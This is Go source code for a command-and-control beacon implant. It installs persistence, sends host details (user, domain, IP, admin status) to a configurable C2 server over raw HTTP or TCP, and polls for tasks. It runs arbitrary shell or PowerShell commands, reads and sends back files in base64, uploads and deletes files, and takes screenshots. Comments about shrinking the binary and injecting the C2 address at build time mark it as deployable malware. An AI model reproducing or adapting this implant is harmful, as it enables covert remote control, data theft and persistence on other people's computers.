package main

import (
	"bytes"
	"crypto/rand"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"io"
	mrand "math/rand"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"time"
)

// Config variables injected via -ldflags -X at build time
var (
	C2_URL         = "http://127.0.0.1:8080"
	SLEEP_INTERVAL = "5"
	JITTER         = "10"
	BEACON_ID      = ""
	PROTO          = "http" // "http" or "tcp"
)

type Task struct {
	ID        string    `json:"id"`
	ClientID  string    `json:"client_id"`
	Command   string    `json:"command"`
	Status    string    `json:"status"`
	Result    string    `json:"result"`
	CreatedAt time.Time `json:"created_at"`
}

type TaskResult struct {
	TaskID string `json:"task_id"`
	Output string `json:"output"`
}

type CheckInData struct {
	BeaconID    string `json:"beacon_id"`
	Hostname    string `json:"hostname"`
	Username    string `json:"username"`
	Domain      string `json:"domain"`
	InternalIP  string `json:"internal_ip"`
	OS          string `json:"os"`
	Arch        string `json:"arch"`
	PID         int    `json:"pid"`
	ProcessName string `json:"process_name"`
	IsAdmin     bool   `json:"is_admin"`
	Sleep       int    `json:"sleep"`
	Jitter      int    `json:"jitter"`
}

type TCPMsg struct {
	Type string          `json:"type"`
	Data json.RawMessage `json:"data,omitempty"`
}

// ==================== RAW HTTP (replaces net/http, saves ~4MB) ====================

// parseURL extracts host:port and path from a URL string
func parseURL(raw string) (hostPort, path string) {
	u := raw
	if strings.HasPrefix(u, "http://") {
		u = u[7:]
	} else if strings.HasPrefix(u, "https://") {
		u = u[8:]
	}
	idx := strings.Index(u, "/")
	if idx >= 0 {
		hostPort = u[:idx]
		path = u[idx:]
	} else {
		hostPort = u
		path = "/"
	}
	if !strings.Contains(hostPort, ":") {
		hostPort += ":80"
	}
	return
}

// httpDo performs a raw HTTP request over TCP, returns response body
func httpDo(method, url string, headers [][2]string, body []byte) ([]byte, error) {
	hostPort, path := parseURL(url)

	conn, err := net.DialTimeout("tcp", hostPort, 10*time.Second)
	if err != nil {
		return nil, err
	}
	defer conn.Close()
	conn.SetDeadline(time.Now().Add(15 * time.Second))

	// Build raw HTTP request
	var buf bytes.Buffer
	buf.WriteString(method)
	buf.WriteString(" ")
	buf.WriteString(path)
	buf.WriteString(" HTTP/1.1\r\nHost: ")
	buf.WriteString(hostPort)
	buf.WriteString("\r\n")
	for _, h := range headers {
		buf.WriteString(h[0])
		buf.WriteString(": ")
		buf.WriteString(h[1])
		buf.WriteString("\r\n")
	}
	if body != nil {
		buf.WriteString("Content-Type: application/json\r\nContent-Length: ")
		buf.WriteString(strconv.Itoa(len(body)))
		buf.WriteString("\r\n")
	}
	buf.WriteString("Connection: close\r\n\r\n")
	if body != nil {
		buf.Write(body)
	}

	conn.Write(buf.Bytes())

	// Read entire response (server will close connection due to Connection: close)
	resp, err := io.ReadAll(conn)
	if err != nil && len(resp) == 0 {
		return nil, err
	}

	// Extract body after \r\n\r\n
	idx := bytes.Index(resp, []byte("\r\n\r\n"))
	if idx >= 0 {
		return resp[idx+4:], nil
	}
	return resp, nil
}

func httpGet(url string, headers [][2]string) ([]byte, error) {
	return httpDo("GET", url, headers, nil)
}

func httpPost(url string, body []byte) ([]byte, error) {
	return httpDo("POST", url, nil, body)
}

// ==================== HOST INFO (replaces os/user with env vars) ====================

func collectHostInfo(sleepSec, jitterPct int) CheckInData {
	info := CheckInData{
		BeaconID: BEACON_ID,
		OS:       runtime.GOOS + " " + runtime.GOARCH,
		Arch:     runtime.GOARCH,
		PID:      os.Getpid(),
		Sleep:    sleepSec,
		Jitter:   jitterPct,
	}

	info.Hostname, _ = os.Hostname()

	// Use env vars instead of os/user (saves ~500KB)
	if runtime.GOOS == "windows" {
		info.Username = os.Getenv("USERNAME")
		info.Domain = os.Getenv("USERDOMAIN")
	} else {
		info.Username = os.Getenv("USER")
	}

	if exe, err := os.Executable(); err == nil {
		info.ProcessName = filepath.Base(exe)
	}

	info.InternalIP = getInternalIP()
	info.IsAdmin = checkAdmin()

	return info
}

func getInternalIP() string {
	addrs, err := net.InterfaceAddrs()
	if err != nil {
		return ""
	}
	for _, addr := range addrs {
		if ipNet, ok := addr.(*net.IPNet); ok && !ipNet.IP.IsLoopback() {
			if ipNet.IP.To4() != nil {
				return ipNet.IP.String()
			}
		}
	}
	return ""
}

func checkAdmin() bool {
	if runtime.GOOS == "windows" {
		cmd := exec.Command("net", "session")
		cmd.SysProcAttr = getSysProcAttr()
		if err := cmd.Run(); err == nil {
			return true
		}
		return false
	}
	return os.Getuid() == 0
}

// ==================== MAIN ====================

func main() {
	if BEACON_ID == "" {
		b := make([]byte, 16)
		rand.Read(b)
		BEACON_ID = hex.EncodeToString(b)
	}

	// Install persistence (copy self + auto-start)
	installPersistence()

	sleepSec, _ := strconv.Atoi(SLEEP_INTERVAL)
	if sleepSec <= 0 {
		sleepSec = 5
	}
	jitterPct, _ := strconv.Atoi(JITTER)
	if jitterPct < 0 {
		jitterPct = 10
	}

	if PROTO == "tcp" {
		runTCP(sleepSec, jitterPct)
	} else {
		runHTTP(sleepSec, jitterPct)
	}
}

// ==================== HTTP MODE ====================

func runHTTP(sleepSec, jitterPct int) {
	register(sleepSec, jitterPct)

	for {
		sleepWithJitter(sleepSec, jitterPct)

		newSleep, newJitter := checkIn(sleepSec, jitterPct)
		if newSleep > 0 {
			sleepSec = newSleep
		}
		if newJitter >= 0 {
			jitterPct = newJitter
		}
	}
}

func register(sleepSec, jitterPct int) {
	info := collectHostInfo(sleepSec, jitterPct)
	jsonData, err := json.Marshal(info)
	if err != nil {
		return
	}

	for i := 0; i < 3; i++ {
		_, err := httpPost(C2_URL+"/checkin", jsonData)
		if err == nil {
			return
		}
		time.Sleep(2 * time.Second)
	}
}

func checkIn(currentSleep, currentJitter int) (int, int) {
	headers := [][2]string{
		{"X-Beacon-ID", BEACON_ID},
		{"X-Beacon-OS", runtime.GOOS + " " + runtime.GOARCH},
	}

	body, err := httpGet(C2_URL+"/checkin?id="+BEACON_ID, headers)
	if err != nil {
		return -1, -1
	}
	content := string(body)

	// Handle sleep config update
	if strings.HasPrefix(content, "SLEEP ") {
		parts := strings.Fields(content)
		ns, nj := -1, -1
		if len(parts) >= 2 {
			if s, e := strconv.Atoi(parts[1]); e == nil {
				ns = s
			}
		}
		if len(parts) >= 3 {
			if j, e := strconv.Atoi(parts[2]); e == nil {
				nj = j
			}
		}
		return ns, nj
	}

	// Handle tasks
	var tasks []Task
	if err := json.Unmarshal(body, &tasks); err == nil && len(tasks) > 0 {
		for _, task := range tasks {
			if task.Command == "__EXIT__" {
				sendResult(task.ID, "BEACON_TERMINATED")
				os.Exit(0)
			}
			output := executeCommand(task.Command)
			sendResult(task.ID, output)
		}
	}

	return -1, -1
}

func sendResult(taskID, output string) {
	result := TaskResult{TaskID: taskID, Output: output}
	jsonData, _ := json.Marshal(result)
	httpPost(C2_URL+"/checkin", jsonData)
}

// ==================== TCP MODE ====================

func tcpWriteMsg(conn net.Conn, msg interface{}) error {
	data, err := json.Marshal(msg)
	if err != nil {
		return err
	}
	length := uint32(len(data))
	header := []byte{byte(length >> 24), byte(length >> 16), byte(length >> 8), byte(length)}
	if _, err := conn.Write(header); err != nil {
		return err
	}
	_, err = conn.Write(data)
	return err
}

func tcpReadMsg(conn net.Conn) ([]byte, error) {
	header := make([]byte, 4)
	if _, err := io.ReadFull(conn, header); err != nil {
		return nil, err
	}
	length := uint32(header[0])<<24 | uint32(header[1])<<16 | uint32(header[2])<<8 | uint32(header[3])
	if length > 10*1024*1024 {
		return nil, io.ErrUnexpectedEOF
	}
	data := make([]byte, length)
	if _, err := io.ReadFull(conn, data); err != nil {
		return nil, err
	}
	return data, nil
}

func runTCP(sleepSec, jitterPct int) {
	for {
		conn, err := net.DialTimeout("tcp", C2_URL, 10*time.Second)
		if err != nil {
			sleepWithJitter(sleepSec, jitterPct)
			continue
		}

		regData, _ := json.Marshal(collectHostInfo(sleepSec, jitterPct))
		err = tcpWriteMsg(conn, TCPMsg{Type: "register", Data: json.RawMessage(regData)})
		if err != nil {
			conn.Close()
			sleepWithJitter(sleepSec, jitterPct)
			continue
		}

		if _, err := tcpReadMsg(conn); err != nil {
			conn.Close()
			sleepWithJitter(sleepSec, jitterPct)
			continue
		}

		for {
			sleepWithJitter(sleepSec, jitterPct)

			if err := tcpWriteMsg(conn, TCPMsg{Type: "checkin"}); err != nil {
				break
			}

			raw, err := tcpReadMsg(conn)
			if err != nil {
				break
			}

			var msg TCPMsg
			if err := json.Unmarshal(raw, &msg); err != nil {
				continue
			}

			switch msg.Type {
			case "tasks":
				var tasks []Task
				if err := json.Unmarshal(msg.Data, &tasks); err != nil {
					continue
				}
				for _, task := range tasks {
					if task.Command == "__EXIT__" {
						resultData, _ := json.Marshal(TaskResult{TaskID: task.ID, Output: "BEACON_TERMINATED"})
						tcpWriteMsg(conn, TCPMsg{Type: "result", Data: json.RawMessage(resultData)})
						tcpReadMsg(conn)
						conn.Close()
						os.Exit(0)
					}
					output := executeCommand(task.Command)
					resultData, _ := json.Marshal(TaskResult{TaskID: task.ID, Output: output})
					if err := tcpWriteMsg(conn, TCPMsg{Type: "result", Data: json.RawMessage(resultData)}); err != nil {
						break
					}
					if _, err := tcpReadMsg(conn); err != nil {
						break
					}
				}

			case "sleep":
				var cfg struct {
					Sleep  int `json:"sleep"`
					Jitter int `json:"jitter"`
				}
				if err := json.Unmarshal(msg.Data, &cfg); err == nil {
					if cfg.Sleep > 0 {
						sleepSec = cfg.Sleep
					}
					if cfg.Jitter >= 0 {
						jitterPct = cfg.Jitter
					}
				}
			}
		}

		conn.Close()
		sleepWithJitter(sleepSec, jitterPct)
	}
}

// ==================== SHARED ====================

func sleepWithJitter(sleepSec, jitterPct int) {
	jitterMs := int(float64(sleepSec*1000) * (float64(jitterPct) / 100.0))
	if jitterMs <= 0 {
		jitterMs = 1
	}
	sleepTime := time.Duration(sleepSec)*time.Second + time.Duration(mrand.Intn(jitterMs*2)-jitterMs)*time.Millisecond
	if sleepTime < time.Second {
		sleepTime = time.Second
	}
	time.Sleep(sleepTime)
}

func executeCommand(cmdStr string) string {
	cmdLower := strings.ToLower(strings.TrimSpace(cmdStr))

	// cd command
	if strings.HasPrefix(cmdLower, "cd ") {
		dir := strings.TrimSpace(cmdStr[3:])
		if err := os.Chdir(dir); err != nil {
			return "Error: " + err.Error()
		}
		if cwd, err := os.Getwd(); err == nil {
			return "Changed directory to: " + cwd
		}
		return "Directory changed"
	}

	// pwd
	if cmdLower == "pwd" || cmdLower == "cwd" {
		if cwd, err := os.Getwd(); err == nil {
			return cwd
		}
		return "Error: could not get working directory"
	}

	// whoami (using env vars instead of os/user)
	if cmdLower == "whoami" || cmdLower == "getuid" {
		h, _ := os.Hostname()
		user := os.Getenv("USERNAME")
		if user == "" {
			user = os.Getenv("USER")
		}
		domain := os.Getenv("USERDOMAIN")
		result := "User: " + user + "\nHostname: " + h
		if domain != "" {
			result += "\nDomain: " + domain
		}
		return result
	}

	// ps
	if cmdLower == "ps" {
		if runtime.GOOS == "windows" {
			cmdStr = "tasklist /v /fo csv"
		} else {
			cmdStr = "ps aux"
		}
	}

	// ifconfig / ipconfig
	if cmdLower == "ifconfig" || cmdLower == "ipconfig" {
		if runtime.GOOS == "windows" {
			cmdStr = "ipconfig /all"
		} else {
			cmdStr = "ip addr"
		}
	}

	// File operations
	if strings.HasPrefix(cmdStr, "__FILELIST__ ") {
		return fileList(strings.TrimSpace(cmdStr[13:]))
	}
	if strings.HasPrefix(cmdStr, "__FILEREAD__ ") {
		return fileRead(strings.TrimSpace(cmdStr[13:]))
	}
	if strings.HasPrefix(cmdStr, "__FILEUPLOAD__ ") {
		rest := strings.TrimSpace(cmdStr[15:])
		idx := strings.Index(rest, " ")
		if idx < 0 {
			return jsonError("usage: __FILEUPLOAD__ <path> <base64data>")
		}
		return fileUpload(rest[:idx], rest[idx+1:])
	}
	if strings.HasPrefix(cmdStr, "__MKDIR__ ") {
		return fileMkdir(strings.TrimSpace(cmdStr[10:]))
	}
	if strings.HasPrefix(cmdStr, "__DELETE__ ") {
		return fileDelete(strings.TrimSpace(cmdStr[10:]))
	}

	// Screenshot
	if cmdStr == "__SCREENSHOT__" {
		return captureScreenshot()
	}

	// Execute via shell
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("powershell", "-NoProfile", "-NonInteractive", "-Command", cmdStr)
	} else {
		cmd = exec.Command("/bin/sh", "-c", cmdStr)
	}
	cmd.SysProcAttr = getSysProcAttr()

	out, err := cmd.CombinedOutput()
	if err != nil {
		return string(out) + "\nError: " + err.Error()
	}
	return string(out)
}

// ==================== FILE OPERATIONS ====================

type FileEntry struct {
	Name    string `json:"name"`
	IsDir   bool   `json:"is_dir"`
	Size    int64  `json:"size"`
	ModTime string `json:"mod_time"`
}

func jsonError(msg string) string {
	out, _ := json.Marshal(map[string]string{"error": msg})
	return string(out)
}

func jsonOK(kv map[string]interface{}) string {
	kv["status"] = "ok"
	out, _ := json.Marshal(kv)
	return string(out)
}

func fileList(dirPath string) string {
	if dirPath == "" {
		dirPath = "."
	}
	if dirPath == "__DRIVES__" {
		return listDrives()
	}

	absPath, err := filepath.Abs(dirPath)
	if err != nil {
		return jsonError(err.Error())
	}

	entries, err := os.ReadDir(absPath)
	if err != nil {
		return jsonError(err.Error())
	}

	var items []FileEntry
	for _, e := range entries {
		info, err := e.Info()
		if err != nil {
			continue
		}
		items = append(items, FileEntry{
			Name:    e.Name(),
			IsDir:   e.IsDir(),
			Size:    info.Size(),
			ModTime: info.ModTime().Format(time.RFC3339),
		})
	}

	result := map[string]interface{}{"path": absPath, "items": items}
	data, _ := json.Marshal(result)
	return string(data)
}

func listDrives() string {
	if runtime.GOOS != "windows" {
		return fileList("/")
	}
	var drives []FileEntry
	for letter := 'A'; letter <= 'Z'; letter++ {
		drivePath := string(letter) + ":\\"
		if _, err := os.Stat(drivePath); err == nil {
			drives = append(drives, FileEntry{Name: string(letter) + ":", IsDir: true})
		}
	}
	result := map[string]interface{}{"path": "__DRIVES__", "items": drives}
	data, _ := json.Marshal(result)
	return string(data)
}

func fileRead(filePath string) string {
	absPath, err := filepath.Abs(filePath)
	if err != nil {
		return jsonError(err.Error())
	}

	info, err := os.Stat(absPath)
	if err != nil {
		return jsonError(err.Error())
	}

	if info.Size() > 50*1024*1024 {
		return jsonError("file too large (>50MB)")
	}

	data, err := os.ReadFile(absPath)
	if err != nil {
		return jsonError(err.Error())
	}

	result := map[string]interface{}{
		"path":   absPath,
		"size":   info.Size(),
		"base64": base64.StdEncoding.EncodeToString(data),
	}
	out, _ := json.Marshal(result)
	return string(out)
}

func fileUpload(filePath, b64Data string) string {
	absPath, err := filepath.Abs(filePath)
	if err != nil {
		return jsonError(err.Error())
	}

	data, err := base64.StdEncoding.DecodeString(b64Data)
	if err != nil {
		return jsonError("base64 decode failed: " + err.Error())
	}

	os.MkdirAll(filepath.Dir(absPath), 0755)

	if err := os.WriteFile(absPath, data, 0644); err != nil {
		return jsonError(err.Error())
	}

	return jsonOK(map[string]interface{}{"path": absPath, "size": len(data)})
}

func fileMkdir(dirPath string) string {
	absPath, err := filepath.Abs(dirPath)
	if err != nil {
		return jsonError(err.Error())
	}

	if err := os.MkdirAll(absPath, 0755); err != nil {
		return jsonError(err.Error())
	}

	return jsonOK(map[string]interface{}{"path": absPath})
}

func fileDelete(targetPath string) string {
	absPath, err := filepath.Abs(targetPath)
	if err != nil {
		return jsonError(err.Error())
	}

	if err := os.RemoveAll(absPath); err != nil {
		return jsonError(err.Error())
	}

	return jsonOK(map[string]interface{}{"path": absPath})
}
